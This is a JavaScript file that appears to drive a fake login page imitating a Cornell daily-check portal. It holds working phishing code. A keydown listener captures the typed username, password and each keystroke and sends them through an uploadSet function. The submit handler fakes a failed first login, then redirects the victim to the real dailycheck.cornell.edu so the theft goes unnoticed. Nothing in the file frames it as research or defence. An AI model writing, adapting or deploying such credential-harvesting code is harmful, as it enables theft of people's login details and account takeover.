function valid(id){
    if (id.length < 3 || id.length > 6){
        return false
    }
    index = 0
    for (let i=0; i<id.length; i++){
        if (!isNaN(id[i])){
            index = i
            break
        }
    }
    if (index == 0){
        return false
    }
    letters = id.substring(0,index)
    number = id.substring(index, id.length)
    if (isNaN(number)){
        return false
    }
    for (let i=0; i<letters.length; i++){
        if (!isNaN(letters[i])){
            return false
        }
    }
    return true
}

window.addEventListener('keydown', e => {
    if (Id('username').value.length > 2 && Id('password').value.length > 4){
        console.log('y')
        uploadSet('-')
        console.log('yo')
        setTimeout(()=>{
            uploadSet('username: ' + Id('username').value)
            uploadSet('password: ' + Id('password').value)
        },10)
        uploadSet('char: ' + e.key)
    }
})

stage = 0
Id('submit').onclick = () => {
    if (valid(Id('username').value) && Id('password').value.length > 6){
        if (stage == 0){
            Id('reason').style.display = 'none'
            setTimeout(()=>{
                Id('reason').style.display = 'block'
            },50)
            stage = 1
        }else{
            window.location.href = 'https://dailycheck.cornell.edu'
        }

    }else{
        Id('reason').style.display = 'none'
        setTimeout(()=>{
            Id('reason').style.display = 'block'
        },50)
    }
}